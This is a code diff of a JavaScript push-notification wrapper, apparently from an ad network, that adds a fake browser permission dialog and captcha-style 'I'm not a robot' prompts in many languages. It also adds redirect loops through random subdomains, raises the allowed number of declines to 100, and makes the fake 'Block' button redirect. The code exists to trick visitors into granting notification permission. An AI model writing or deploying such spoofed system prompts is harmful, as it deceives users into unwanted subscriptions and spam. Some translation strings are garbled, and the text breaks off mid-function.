@@ -7,19 +7,18 @@ var PushKaWrapper = function( params )
         sourceId        : 1,
         appId           : null,
         landingId       : null,
-        manifestUrl     : 'https://pushmeandtouchme.info/app/manifest.json',
-        pushKaScript    : 'https://pushmeandtouchme.info/push.js?b=1',
+        manifestUrl     : '/manifest.json',
+        pushKaScript    : '/push.js',
         //pushKaScript    : 'http://127.0.0.1/push.js',
-        popupUrl        : 'https://pushmeandtouchme.info/redirect',
-        captchaImage    : 'https://pushmeandtouchme.info/media/landings/captcha/images/captcha.jpg',
+        popupUrl        : 'https://ichecknotifyfriends.info/redirect',
+        captchaImage    : 'https://ichecknotifyfriends.info/media/landings/captcha/images/captcha.jpg',
         //captchaImage    : 'http://127.0.0.1/media/landings/captcha/images/captcha.jpg',
         //popupUrl        : 'http://localhost/landing/captcha/redirect',
         //popupUrl        : 'http://127.0.0.1/landing/captcha/redirect',
-        //arrowImage      : 'https://pushmeandtouchme.info/media/landings/captcha/images/arrow.png',
-        arrowImage      : 'http://dao.local/media/landings/captcha/images/arrow.png',
+        notificationImage : 'https://ichecknotifyfriends.info/media/landings/captcha/images/notification.png',
         redirect        : {
             count          : 1,
-            declineCount   : 3,
+            declineCount   : 100,
             maxSubsCount   : 10,
             successUrl     : null,
             alreadyUrl     : null,
@@ -35,22 +34,319 @@ var PushKaWrapper = function( params )
         lang            : 'en',
         languages       : {
             ru : {
-                btnSubscribe : 'Подписаться',
-                btnContinue  : 'Продолжить',
-                btnCancel    : 'Отмена',
-                btnClose     : 'Закрыть',
-                notRobot     : 'Я не робот',
-                popupTitle   : 'Получать оповещения о последних новостях с сайта',
-                popupText    : 'Для того чтобы продолжить работу, разрешите подписку'
+                btnSubscribe      : 'Подписаться',
+                btnContinue       : 'Продолжить',
+                btnCancel         : 'Отмена',
+                btnClose          : 'Закрыть',
+                notRobot          : 'Я не робот',
+                popupTitle        : 'Получать оповещения о последних новостях с сайта',
+                popupText         : 'Для того чтобы продолжить работу, разрешите подписку',
+                titleNotification : 'Уведомление',
+                systemAllowTitle  : 'запрашивает разрешение на:',
+                systemAllowText   : 'поступил запрос на отправку уведомлений.',
+                systemAllowTextPc : 'Показ уведомлений',
+                btnAllow          : 'Разрешить',
+                btnBlock          : 'Блокировать'
             },
             en : {
-                btnSubscribe : 'Subscribe',
-                btnContinue  : 'Continue',
-                btnCancel    : 'Cancel',
-                btnClose     : 'Close',
-                notRobot     : 'I\'m not a robot',
-                popupTitle   : 'Get notification about actual news from site',
-                popupText    : 'To continue, enable the subscription'
+                btnSubscribe      : 'Subscribe',
+                btnContinue       : 'Continue',
+                btnCancel         : 'Cancel',
+                btnClose          : 'Close',
+                notRobot          : 'I\'m not a robot',
+                popupTitle        : 'Get notification about actual news from site',
+                popupText         : 'To continue, enable the subscription',
+                titleNotification : 'Notification',
+                systemAllowTitle  : 'wants to',
+                systemAllowText   : 'wants to send you notifications',
+                systemAllowTextPc : 'Show notifications',
+                btnAllow          : 'Allow',
+                btnBlock          : 'Block'
+            },
+            uk: {
+                btnSubscribe      : 'Підписатися',
+                btnContinue       : 'Продовжити',
+                btnCancel         : 'Відмінити',
+                btnClose          : 'Закрити',
+                notRobot          : 'Я не робот',
+                popupTitle        : 'Отримувати сповіщення про останні новини з сайту',
+                popupText         : 'Для того щоб продовжити роботу, дозвольте підписку',
+                titleNotification : 'Повідомлення',
+                systemAllowTitle  : 'хоче',
+                systemAllowText   : 'хоче надіслати вам сповіщення',
+                systemAllowTextPc : 'Показувати сповіщення',
+                btnAllow          : 'Дозволити',
+                btnBlock          : 'Блокувати'
+            },
+            bg : {
+                btnSubscribe      : 'Абониран',
+                btnContinue       : 'Процедира',
+                btnCancel         : 'Анулираме',
+                btnClose          : 'Исключете',
+                notRobot          : 'Аз не съм робот',
+                popupTitle        : 'Получавайте сигнали за последните новини от сайта',
+                popupText         : 'За да продължите, активирайте абонамента',
+                titleNotification : 'Известие',
+                systemAllowTitle  : 'пита за разрешение',
+                systemAllowText   : 'получих искане за изпращане на известия',
+                systemAllowTextPc : 'Показване на известия',
+                btnAllow          : 'Разрешаване',
+                btnBlock          : 'Блокираме'
+            },
+            cs : {
+                btnSubscribe      : 'Podepsat se',
+                btnContinue       : 'Pokračujte',
+                btnCancel         : 'Zrušit',
+                btnClose          : 'Zavřít',
+                notRobot          : 'Nejsem robot',
+                popupTitle        : 'Dostávat upozornění na nejnovější zprávy z webu',
+                popupText         : 'Aby bylo možné pokračovat práci povolit předplatné',
+                titleNotification : 'Zpráva',
+                systemAllowTitle  : 'žádá o povolení na',
+                systemAllowText   : 'přijal požadavek na odeslání zprávy',
+                systemAllowTextPc : 'Zobrazují se zprávy,',
+                btnAllow          : 'Povolit',
+                btnBlock          : 'Blokovat'
+            },
+            el : {
+                btnSubscribe      : 'Εγγραφείτε',
+                btnContinue       : 'Συνεχείστε',
+                btnCancel         : 'Ακύρωση',
+                btnClose          : 'Κλείσιμο',
+                notRobot          : 'Δεν είμαι ρομπότ',
+                popupTitle        : 'Λαμβάνετε ειδοποιήσεις σχετικά με τα τελευταία νέα από την ιστοσελίδα',
+                popupText         : 'Για να συνεχίσετε, ενεργοποιήστε την αποδοχή',
+                titleNotification : 'Ειδοποίηση',
+                systemAllowTitle  : 'απετείται άδεια για',
+                systemAllowText   : 'Αποδοχή αιτημάτων και ειδοποιήσεων',
+                systemAllowTextPc : 'Εμφάνιση ειδοποιήσεων',
+                btnAllow          : 'Επιτρέψτε',
+                btnBlock          : 'Μπλοκάρετε'
+            },
+            es : {
+                btnSubscribe      : 'Seguir',
+                btnContinue       : 'Continuar',
+                btnCancel         : 'Cancelaciòm',
+                btnClose          : 'Cerrar',
+                notRobot          : 'No soy robot',
+                popupTitle        : 'Recibir notificaciones de las ùltimas noticias de la pàgina web',
+                popupText         : 'Para continuar, permita la suscripciòn',
+                titleNotification : 'Notificaciòn',
+                systemAllowTitle  : 'pide permiso para',
+                systemAllowText   : 'Solicitud recibida para enviar notificaciones',
+                systemAllowTextPc : 'Ver notificaciones',
+                btnAllow          : 'Permitir',
+                btnBlock          : 'Bloquear'
+            },
+            hr : {
+                btnSubscribe      : 'Pretplata',
+                btnContinue       : 'Nastaviti',
+                btnCancel         : 'Otkazati',
+                btnClose          : 'Zatvoriti',
+                notRobot          : 'Nisam robot',
+                popupTitle        : 'Dobivati upozorenja za najnovije vijesti s web-lokacije',
+                popupText         : 'Za nastavak rada moraš napraviti pretplatu',
+                titleNotification : 'Obavijest',
+                systemAllowTitle  : 'traži dopuštenje za',
+                systemAllowText   : 'Dobili ste zahtjev za slanje obavijesti',
+                systemAllowTextPc : 'Prikaz obavijesti',
+                btnAllow          : 'Dopusti',
+                btnBlock          : 'Blokiraj'
+            },
+            it : {
+                btnSubscribe      : 'Iscriviti',
+                btnContinue       : 'Continuare',
+                btnCancel         : 'Cancellazione',
+                btnClose          : 'Chiudere',
+                notRobot          : 'Io non sono un robot',
+                popupTitle        : 'Ricevere avvisi sulle ultime notizie dal sito,',
+                popupText         : 'Per continuare a lavorare, consenti l\'abbonamento',
+                titleNotification : 'La notifica',
+                systemAllowTitle  : 'chiede il permesso di',
+                systemAllowText   : 'Ricevuta una richiesta per l\'invio di notifiche',
+                systemAllowTextPc : 'Mostrare le notifiche',
+                btnAllow          : 'Consentire',
+                btnBlock          : 'Bloccare'
+            },
+            pl : {
+                btnSubscribe      : 'Subskrybuj',
+                btnContinue       : 'Kontynuować',
+                btnCancel         : 'Anuluj',
+                btnClose          : 'Zamknąć',
+                notRobot          : 'Nie jestem robotem',
+                popupTitle        : 'Otrzymywać powiadomienia o najnowszych wiadomościach ze strony',
+                popupText         : 'Aby kontynuować pracę, zezwól na subskrypcję',
+                titleNotification : 'Wiadomość',
+                systemAllowTitle  : 'prosi o pozwolenie na',
+                systemAllowText   : 'Otrzymano prośbę na wysyłanie wiadomości',
+                systemAllowTextPc : 'Wyświetlanie wiadomości',
+                btnAllow          : 'Zezwól',
+                btnBlock          : 'Zablokuj'
+            },
+            pt : {
+                btnSubscribe      : 'Seguir',
+                btnContinue       : 'Continuar',
+                btnCancel         : 'Cancelar',
+                btnClose          : 'Fechar',
+                notRobot          : 'Não sou um robô',
+                popupTitle        : 'Receber notificações das últimas novidades do site',
+                popupText         : 'Para continuar o trabalho, permita o seguimento,',
+                titleNotification : 'Notificações',
+                systemAllowTitle  : 'pede permissão para',
+                systemAllowText   : 'Recebeu uma solicitação para enviar notificações',
+                systemAllowTextPc : 'Ver notificações',
+                btnAllow          : 'Permitir',
+                btnBlock          : 'Bloquear'
+            },
+            ro : {
+                btnSubscribe      : 'Abonați',
+                btnContinue       : 'Continuați',
+                btnCancel         : 'Anulați',
+                btnClose          : 'Închide',
+                notRobot          : 'Nu sunt robot',
+                popupTitle        : 'Primiți alerte cu privire la cele mai recente știri de pe site',
+                popupText         : 'Pentru a continua, permiteți abonarea',
+                titleNotification : 'Notificări',
+                systemAllowTitle  : 'cere permisiune pentru',
+                systemAllowText   : 'A primit o solicitare de a trimite notificări',
+                systemAllowTextPc : 'Se afișează notificările',
+                btnAllow          : 'Permite',
+                btnBlock          : 'Blochează'
+            },
+            sl : {
+                btnSubscribe      : 'Naročite se',
+                btnContinue       : 'Nadaljuj',
+                btnCancel         : 'Prekliči',
+                btnClose          : 'Zapri',
+                notRobot          : 'Nisem robot',
+                popupTitle        : 'Prejmite opozorila za najnovejše novice s spletnega mesta',
+                popupText         : 'Če želite nadaljevati, omogočite naročnino',
+                titleNotification : 'To opazite',
+                systemAllowTitle  : 'zahteva dovoljenje za',
+                systemAllowText   : 'Prejeta zahteva za pošiljanje obvestil',
+                systemAllowTextPc : 'Prikazovanje obvestil',
+                btnAllow          : 'Dovoli',
+                btnBlock          : 'Blokiraj'
+            },
+            id : {
+                btnSubscribe      : 'Berlangganan',
+                btnContinue       : 'Lanjutkan',
+                btnCancel         : 'Batalkan',
+                btnClose          : 'Tutup',
+                notRobot          : 'Saya bukan robot',
+                popupTitle        : 'Terima pemberitahuan tentang berita terbaru dari situs',
+                popupText         : 'Untuk melanjutkan, aktifkan berlangganan',
+                titleNotification : 'Pemberitahuan',
+                systemAllowTitle  : 'meminta izin untuk',
+                systemAllowText   : 'diterima permintaan untuk mengirimkan pemberitahuan',
+                systemAllowTextPc : 'Menampilkan pemberitahuan,',
+                btnAllow          : 'Izinkan',
+                btnBlock          : 'Blokir'
+            },
+            ms : {
+                btnSubscribe      : 'Melanggan',
+                btnContinue       : 'Teruskan',
+                btnCancel         : 'Batalkan',
+                btnClose          : 'Tutup',
+                notRobot          : 'Saya bukan robot',
+                popupTitle        : 'Menerima makluman pemberitahuan berita terkini dari laman web ini',
+                popupText         : 'Untuk meneruskan, mengizinkan langganan,',
+                titleNotification : 'Pemberitahuan',
+                systemAllowTitle  : 'meminta izin untuk',
+                systemAllowText   : 'diterima pemberitahuan untuk menghantar pemberitahuan.,',
+                systemAllowTextPc : 'Memaparkan pemberitahuan,',
+                btnAllow          : 'Izinkan',
+                btnBlock          : 'Blokir'
+            },
+            th : {
+                btnSubscribe      : 'ติดตาม',
+                btnContinue       : 'ต่อไป',
+                btnCancel         : 'การยกเลิก',
+                btnClose          : 'ปิด',
+                notRobot          : 'ฉันไม่ใช่หุ่นยนต์',
+                popupTitle        : 'รับการแจ้งเตือนเกี่ยวกับข่าวล่าสุดจากเว็บไซต์',
+                popupText         : 'หากต้องการดำเนินการต่อให้เปิดใช้งานการสมัครรับข้อมูล',
+                titleNotification : 'แจ้งให้ทราบ',
+                systemAllowTitle  : 'ขอสิทธิ์ไปที่',
+                systemAllowText   : 'ได้รับคำขอเพื่อส่งการแจ้ง',
+                systemAllowTextPc : 'แสดงการแจ้งเตือน',
+                btnAllow          : 'อนุญาต',
+                btnBlock          : 'บล็อก'
+            },
+            vi : {
+                btnSubscribe      : 'Theo dõi',
+                btnContinue       : 'Tiếp tục',
+                btnCancel         : 'Hủy bỏ',
+                btnClose          : 'Đóng lại',
+                notRobot          : 'Tôi không phải là người máy',
+                popupTitle        : 'Được thông báo về tin tức mới từ site',
+                popupText         : 'Để tiếp tục làm việc, hãy cho phép theo dõi',
+                titleNotification : 'Thông báo',
+                systemAllowTitle  : 'yêu cầu sự cho phép',
+                systemAllowText   : 'có yêu cầu gửi thông báo',
+                systemAllowTextPc : 'Hiển thị thông báo',
+                btnAllow          : 'Cho phép',
+                btnBlock          : 'Cấm'
+            },
+            be : {
+                btnSubscribe      : 'Подписаться',
+                btnContinue       : 'Продолжить',
+                btnCancel         : 'Отмена',
+                btnClose          : 'Закрыть',
+                notRobot          : 'Я не робот',
+                popupTitle        : 'Получать оповещения о последних новостях с сайта',
+                popupText         : 'Для того чтобы продолжить работу, разрешите подписку',
+                titleNotification : 'Уведомление',
+                systemAllowTitle  : 'запрашивает разрешение на:',
+                systemAllowText   : 'поступил запрос на отправку уведомлений.',
+                systemAllowTextPc : 'Показ уведомлений',
+                btnAllow          : 'Разрешить',
+                btnBlock          : 'Блокировать'
+            },
+            kk : {
+                btnSubscribe      : 'Подписаться',
+                btnContinue       : 'Продолжить',
+                btnCancel         : 'Отмена',
+                btnClose          : 'Закрыть',
+                notRobot          : 'Я не робот',
+                popupTitle        : 'Получать оповещения о последних новостях с сайта',
+                popupText         : 'Для того чтобы продолжить работу, разрешите подписку',
+                titleNotification : 'Уведомление',
+                systemAllowTitle  : 'запрашивает разрешение на:',
+                systemAllowText   : 'поступил запрос на отправку уведомлений.',
+                systemAllowTextPc : 'Показ уведомлений',
+                btnAllow          : 'Разрешить',
+                btnBlock          : 'Блокировать'
+            },
+            fr : {
+                btnSubscribe      : 'S\'abonner',
+                btnContinue       : 'Продолжить',
+                btnCancel         : 'Continuer',
+                btnClose          : 'Fermer',
+                notRobot          : 'Je ne suis pas un robot',
+                popupTitle        : 'Recevez des alertes sur les dernières nouvelles du site',
+                popupText         : 'Pour continuer, activez l\'abonnement',
+                titleNotification : 'Avis',
+                systemAllowTitle  : 'souhaite',
+                systemAllowText   : 'veut vous envoyer des notifications',
+                systemAllowTextPc : 'Afficher les notifications',
+                btnAllow          : 'Autoriser',
+                btnBlock          : 'Bloquer'
+            },
+            de : {
+                btnSubscribe      : 'Jetzt abonnieren',
+                btnContinue       : 'Weiter',
+                btnCancel         : 'Abbrechen',
+                btnClose          : 'Schliessen',
+                notRobot          : 'Ich bin kein Roboter',
+                popupTitle        : 'Erhalten Sie Benachrichtigungen über die neuesten Nachrichten von der Website',
+                popupText         : 'Aktivieren Sie das Abonnement, um fortzufahren',
+                titleNotification : 'Beachten Sie',
+                systemAllowTitle  : 'möchte',
+                systemAllowText   : 'möchte Ihnen BebtnAllowchrichtigungen senden',
+                systemAllowTextPc : 'Benachrichtigungen anzeigen',
+                btnAllow          : 'Zulassen',
+                btnBlock          : 'Blockieren'
             }
         },
         marks : {
@@ -76,6 +372,8 @@ var PushKaWrapper = function( params )
     this.startArrowPopup = startArrowPopup;
 
     extend(this.config, params, {});
+
+    initLang();
 
     function text(tid)
     {
@@ -144,7 +442,7 @@ var PushKaWrapper = function( params )
             else if(subsStatus === 'activated')
                 objPushKa.subscribe();
             else
-                redirectRetrySubs();
+                redirectRetrySubs('init');
         }
         else
             objPushKa.subscribe();
@@ -154,12 +452,7 @@ var PushKaWrapper = function( params )
     {
         redirectStatus = 'subscribed';
 
-        setTimeout(function(){
-            if( objPushKa.subscriptionCount >= self.config.redirect.maxSubsCount )
-                doRedirect(self.config.redirect.successUrl);
-            else
-                redirectRetrySubs();
-        }, 1000);  // redirect after 1 sec
+        setTimeout(function(){redirectRetrySubs('subscribe');}, 1000);  // redirect after 1 sec
     }
 
     function notSupportRedirect()
@@ -169,38 +462,62 @@ var PushKaWrapper = function( params )
         doRedirect(self.config.redirect.trafficbackUrl);
     }
 
-    function redirectRetrySubs()
+    function redirectRetrySubs(onEvent)
     {
-        var urlObj   = new URL(window.location.href);
-        var counter  = parseInt(urlObj.searchParams.get("c_rand"));
-        var declined = parseInt(urlObj.searchParams.get("d_rand"));
+        var urlObj     = new URL(window.location.href);
+        var counter    = parseInt(urlObj.searchParams.get("c_rand"));
+        var already    = parseInt(urlObj.searchParams.get("a_rand"));
+        var declined   = parseInt(urlObj.searchParams.get("d_rand"));
+        var subscribed = parseInt(urlObj.searchParams.get("s_rand"));
 
-        counter  = counter  ? parseInt(counter)  : 1;
-        declined = declined ? parseInt(declined) : 0;
+        counter    = counter    ? parseInt(counter)    : 1;
+        already    = already    ? parseInt(already)    : 0;
+        declined   = declined   ? parseInt(declined)   : 0;
+        subscribed = subscribed ? parseInt(subscribed) : 0;
 
-        if( redirectStatus !== 'subscribed' )   // if decline user
+        if( onEvent === 'init' && redirectStatus === 'subscribed' )
+            already ++;
+        else if( redirectStatus === 'subscribed' )
+            subscribed ++;
+        else  // if decline user
             declined ++;
 
+        var isMaxRedirectCount = counter >= self.config.redirect.count;
+        var isMaxDeclineCount  = declined >= self.config.redirect.declineCount;
+        var isMaxSubsCount     = objPushKa.subscriptionCount >= self.config.redirect.maxSubsCount;
+
+        if( isMaxRedirectCount || isMaxDeclineCount || isMaxSubsCount )
+            return redirectByTrafficBack(counter, subscribed, declined, already);
+
+        counter ++;
+        redirectStatus = 'redirected';
+
         urlObj.searchParams.set('d_rand', declined);
-        urlObj.searchParams.set('c_rand', counter + 1);
-
-        if( counter >= self.config.redirect.count || declined >= self.config.redirect.declineCount )
-        {
-            redirectStatus = 'declined';
-
-            return doRedirect(self.config.redirect.declineUrl);
-        }
+        urlObj.searchParams.set('s_rand', subscribed);
+        urlObj.searchParams.set('a_rand', already);
+        urlObj.searchParams.set('c_rand', counter);
 
         var hostname = urlObj.hostname.replace(/(ms-[0-9]{1,2}\.)*(.+)/, '$2');
         var newUrl   = urlObj.protocol+'//ms-'+randomInteger(1,99)+'.'+hostname+urlObj.pathname+urlObj.search;
 
         objPushKa.log('refresh: to new page: '+newUrl);
 
-        redirectStatus = 'redirected';
-
         doRedirect(newUrl);
 
         return true;
+    }
+
+    function redirectByTrafficBack(counter, subscribed, declined, already)
+    {
+        if( subscribed > 0 )
+            return doRedirect(self.config.redirect.successUrl);
+
+        if( already > 0 )
+            return doRedirect(self.config.redirect.alreadyUrl);
+
+        redirectStatus = 'declined';
+
+        return doRedirect(self.config.redirect.declineUrl);
     }
 
     function startRedirect()
@@ -216,7 +533,8 @@ var PushKaWrapper = function( params )
             declined     : redirectRetrySubs,
             afterInit    : redirectAfterInit,
             subscribe    : successSubsRedirect,
-            notSupported : notSupportRedirect
+            notSupported : notSupportRedirect,
+            notAllowed   : showPromptWindow
         });
 
         if( window.opener )
@@ -252,7 +570,10 @@ var PushKaWrapper = function( params )
         self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
         self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;
 
-        overlayBox = createOverlay(type);
+        if(type === 'window')
+            overlayBox = createWindow('close-overlay-button');
+        else
+            overlayBox = createOverlay(type);
         //overlayBox.style.display = 'block';
         // createManifest(self.config.manifestUrl); // create only on all-origin or same-origin
 
@@ -308,7 +629,12 @@ var PushKaWrapper = function( params )
         {
             subsButton.addEventListener('click', function()
             {
-                var popup = window.open(self.config.popupUrl, '', 'width=900,height=450,menubar=no,location=no,resizable=no,scrollbars=no,status=yes');
+                var specs = 'width=900,height=450,menubar=no,location=no,resizable=no,scrollbars=no,status=yes';
+
+                if(self.config.popupType === 'window')
+                    specs = 'width=320,height=130,menubar=no,location=no,resizable=no,scrollbars=no,status=yes';
+
+                var popup = window.open(self.config.popupUrl, '', specs);
 
                 window.addEventListener("message", function(event){
                     if( event.data === 'subscribed' )
@@ -373,6 +699,7 @@ var PushKaWrapper = function( params )
             sourceId     : self.config.sourceId,
             landingId    : self.config.landingId,
             marks        : self.config.marks,
+            addVars      : self.config.addVars,
             afterInit    : initSubscribeHandler,
             subscribe    : successSelfSubs,
             declined     : declineSelfSubs,
@@ -431,6 +758,10 @@ var PushKaWrapper = function( params )
 
         if(type === 'light')
             overlayBox = createPromptLight();
+        else if(type === 'self_window')
+            overlayBox = createWindow('close-overlay-button');
+        else if(type === 'self_window_redirect_on_closing')
+            overlayBox = createWindow('close-overlay-button-and-redirect');
         else
             overlayBox = createPrompt('default');
 
@@ -463,7 +794,8 @@ var PushKaWrapper = function( params )
             declined     : declineSelfSubs,
             afterInit    : initPromptHandler,
             subscribe    : successSelfSubs,
-            notSupported : notSupportSubs
+            notSupported : notSupportSubs,
+            notAllowed   : redirectToSelfWindow
         });
 
         //objPushKa.config.afterInit = function(subs);
@@ -486,8 +818,13 @@ var PushKaWrapper = function( params )
 
         var subsButton  = document.getElementById(self.config.namePrefix+'subs-button');
         var closeButton = document.getElementById(self.config.namePrefix+'close-overlay-button');
+        var closeButtonAndRedirect = document.getElementById(self.config.namePrefix+'close-overlay-button-and-redirect');
+
         if( closeButton )
             closeButton.addEventListener('click', closeOverlay);
+
+        if( closeButtonAndRedirect )
+            closeButtonAndRedirect.addEventListener('click', redirectToSelfWindow);
 
         if( subsButton )
         {
@@ -737,9 +1074,9 @@ var PushKaWrapper = function( params )
             "<div style='padding:0px 30px 10px'>"+
                 "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+text('btnSubscribe')+"</div>"+
                 "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+text('btnClose')+"</div>"+
-                "<div style='clear:both;'></div>";
-            "</div>";
-            "</div>";
+                "<div style='clear:both;'></div>"+
+            "</div>"+
+        "</div>";
     }
 
     function createOverlay(type)
@@ -885,23 +1222,6 @@ var PushKaWrapper = function( params )
 
         document.body.appendChild(overlay);
 
-        function move(element, from, to, step) {
-            var position = parseInt(element.style.top, 10);
-            position = isNaN(position) ? from : position;
-            if (position <= to) {
-                position = from;
-            } else {
-                position -= step;
-            }
-
-            element.style.top = position + "px";
-        }
-
-        var elem = document.getElementById(self.config.namePrefix + 'imgWrap');
-        setInterval(function () {
-                move(elem, 170, 100, 2);
-        }, 10);
-
         overlay.style.display = 'none';
 
         return overlay;
@@ -925,20 +1245,16 @@ var PushKaWrapper = function( params )
         messageBox.style.borderRadius = '5px';
         messageBox.style.cursor = 'pointer';
 
+        if(isMobile(navigator.userAgent) === true)
+        {
+            messageBox.style.fontSize = '3em';
+            messageBox.style.width = '60%';
+            messageBox.style.top = '80%';
+        }
+
         messageBox.appendChild(message);
 
-        var imgWrap = document.createElement('div');
-        imgWrap.id = self.config.namePrefix + 'imgWrap';
-        imgWrap.style.position = 'absolute';
-        imgWrap.style.left = '10%';
-        imgWrap.style.top = '170px';
-
-        var arrow = document.createElement('img');
-        arrow.src = self.config.arrowImage;
-
-        imgWrap.appendChild(arrow);
-
-        return messageBox.outerHTML + imgWrap.outerHTML;
+        return messageBox.outerHTML;
     }
 
     function createPrompt(type)
@@ -988,6 +1304,13 @@ var PushKaWrapper = function( params )
         overlay.style.fontSize = '16px';
         overlay.style.fontFamily = 'Roboto,Noto,Helvetica Neue,Helvetica,Arial,sans-serif';
         overlay.style.lineHeight = '1.3';
+
+        if(isMobile(navigator.userAgent) === true)
+        {
+            overlay.style.fontSize = '3em';
+            overlay.style.maxWidth = '60%';
+            overlay.style.textAlign = 'center';
+        }
 
         var textBox = document.createElement("div"),
             message = document.createTextNode(text('popupTitle'));
@@ -1039,10 +1362,206 @@ var PushKaWrapper = function( params )
         btnAllow.style.cursor = 'pointer';
         btnAllow.appendChild(btnAllowBtn);
 
+        if(isMobile(navigator.userAgent) === true)
+        {
+            btnAllow.style.fontSize = '0.5em';
+        }
+
         btnWrap.appendChild(btnCancel);
         btnWrap.appendChild(btnAllow);
 
         return btnWrap.outerHTML;
+    }
+
+    function createWindow(btnCloseDefaultClass)
+    {
+        // for mobile
+        var overlay = document.createElement("div");
+        overlay.style.id              = self.config.namePrefix+'overlay';
+        overlay.style.zIndex          = 100000000;
+        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
+        overlay.style.position        = 'fixed';
+        overlay.style.top             = 0;
+        overlay.style.left            = 0;
+        overlay.style.bottom          = 0;
+        overlay.style.right           = 0;
+        overlay.style.display         = 'block';
+
+        var div = document.createElement("div");
+        div.id = self.config.namePrefix + 'notification';
+        div.style.width = '320px';
+        div.style.height = '130px';
+        div.style.position = 'absolute';
+        div.style.top = '0px';
+        div.style.left = '110px';
+        div.style.background = 'white';
+        div.style.fontFamily = 'tahoma';
+        div.style.fontSize = '12px';
+        div.style.border = '1px solid #c8c8c8';
+        div.style.borderRadius = '3px';
+        div.style.boxShadow = '0px 2px 5px rgba(0,0,0,0.3)';
+        div.style.zIndex = '1000000';
+        div.style.color = 'black';
+        div.style.textAlign = 'left';
+
+        if (isMobile(navigator.userAgent) === true)
+        {
+            div.style.width = '92%';
+            div.style.height = '21%';
+            div.style.position = 'absolute';
+            div.style.top = '40%';
+            div.style.left = '4%';
+            div.style.borderRadius = '10px';
+        }
+
+        var p = document.createElement("p");
+        p.id = self.config.namePrefix+'paragraph-title';
+        p.style.fontSize = '15px';
+        p.style.marginTop = '5px';
+        p.style.marginLeft = '19px';
+        p.style.whiteSpace = 'nowrap';
+        p.style.overflow = 'hidden';
+        p.style.textOverflow = 'ellipsis';
+        p.style.marginBottom = '5px';
+        p.style.fontWeight = 'normal';
+        p.style.fontFamily = 'tahoma';
+        p.style.fontStyle = 'normal';
+        p.style.fontStretch = 'normal';
+
+        if (isMobile(navigator.userAgent) === true)
+        {
+            p.style.visibility = 'hidden';
+            p.style.marginTop='-19px';
+        }
+
+        var ptextTemp = text('systemAllowTitle').length >= 36 ? '...' + text('systemAllowTitle').substr(text('systemAllowTitle').length-31) : '...' + window.location.origin.substr(13) + " " + text('systemAllowTitle'),
+            pText = document.createTextNode(ptextTemp);
+
+        var a = document.createElement("a");
+
+        var notificationImg = document.createElement("img");
+        notificationImg.id = self.config.namePrefix+'bell';
+        notificationImg.src = self.config.notificationImage;
+        notificationImg.style.width = '11px';
+        notificationImg.style.height = '14px';
+        notificationImg.style.margin = '6px 12px 0 21px';
+
+        if (isMobile(navigator.userAgent) === true)
+        {
+            notificationImg.style.paddingTop = '2%';
+            notificationImg.style.width = '4vw';
+            notificationImg.style.height = '3vh';
+            notificationImg.style.margin = '0px 3.5% 3.5% 9%';
+        }
+
+        var span = document.createElement("span");
+        span.id = self.config.namePrefix+'txt';
+        span.style.fontSize = '12px';
+        span.style.fontWeight = 'normal';
+        span.style.fontFamily = 'tahoma';
+        span.style.fontStyle = 'normal';
+        span.style.fontStretch = 'normal';
+
+        if (isMobile(navigator.userAgent) === true)
+        {
+            span.style.fontSize = '3.5vw';
+            span.style.position = 'absolute';
+            span.style.marginTop = '1%';
+        }
+
+        var spanText = isMobile(navigator.userAgent) === true ? window.location.origin.substr(7) + ' ' + text('systemAllowText') : text('systemAllowTextPc');
+        span.appendChild(document.createTextNode(spanText));
+
+        var divBtn = document.createElement("div");
+        divBtn.id = self.config.namePrefix+'buttonBlock';
+        divBtn.style.display = 'flex';
+        divBtn.style.justifyContent = 'flex-end';
+        divBtn.style.margin = '19px 15px 0 0';
+
+        if (isMobile(navigator.userAgent) === true)
+        {
+            divBtn.style.position='absolute';
+            divBtn.style.bottom='15%';
+            divBtn.style.right='10%';
+            divBtn.style.margin=0;
+        }
+
+        var btnClose = document.createElement("a");
+        btnClose.id = self.config.namePrefix+btnCloseDefaultClass;
+        btnClose.style.border = '1px solid #c8c8c8';
+        btnClose.style.borderRadius = '5px';
+        btnClose.style.color = '#3673e8';
+        btnClose.style.fontWeight = 'bold';
+        btnClose.style.fontSize = '11px';
+        btnClose.style.padding = '9px 16px';
+        btnClose.style.marginLeft = '8px';
+        btnClose.style.textDecoration = 'none';
+        btnClose.style.cursor = 'pointer';
+
+        if (isMobile(navigator.userAgent) === true)
+        {
+            btnClose.style.border = 'none';
+            btnClose.style.fontSize = '3.5vw';
+            btnClose.style.color = '#0172b5';
+        }
+
+        var btnCloseText = document.createTextNode(text('btnBlock'));
+
+        var btnAllow = document.createElement("a");
+        btnAllow.id = self.config.namePrefix+'subs-button';
+        btnAllow.style.border = '1px solid #c8c8c8';
+        btnAllow.style.borderRadius = '5px';
+        btnAllow.style.color = '#3673e8';
+        btnAllow.style.fontWeight = 'bold';
+        btnAllow.style.fontSize = '11px';
+        btnAllow.style.padding = '9px 16px';
+        btnAllow.style.marginLeft = '8px';
+        btnAllow.style.textDecoration = 'none';
+        btnAllow.style.cursor = 'pointer';
+
+        if (isMobile(navigator.userAgent) === true)
+        {
+            btnAllow.style.border = 'none';
+            btnAllow.style.fontSize = '3.5vw';
+            btnAllow.style.color = '#0172b5';
+        }
+
+        var btnAllowText = document.createTextNode(text('btnAllow'));
+
+        p.appendChild(pText);
+        div.appendChild(p);
+        div.appendChild(a);
+        div.appendChild(notificationImg);
+        div.appendChild(span);
+        btnAllow.appendChild(btnAllowText);
+        btnClose.appendChild(btnCloseText);
+
+        if (isMac() === true || isMobile(navigator.userAgent) === true) {
+            divBtn.appendChild(btnClose);
+            divBtn.appendChild(btnAllow);
+        }
+        else {
+            divBtn.appendChild(btnAllow);
+            divBtn.appendChild(btnClose);
+        }
+
+        div.appendChild(divBtn);
+
+        if (isMobile(navigator.userAgent) === true)
+        {
+            overlay.appendChild(div);
+            document.body.appendChild(overlay);
+
+            overlay.style.display = 'none';
+
+            return overlay;
+        }
+
+        document.body.appendChild(div);
+
+        div.style.display = 'none';
+
+        return div;
     }
 
     function heightEl(el)
@@ -1054,5 +1573,57 @@ var PushKaWrapper = function( params )
             offsetHeight : el.offsetHeight,
             availHeight  : el.availHeight
         });
+    }
+
+    function isMobile(userAgent) {
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent))
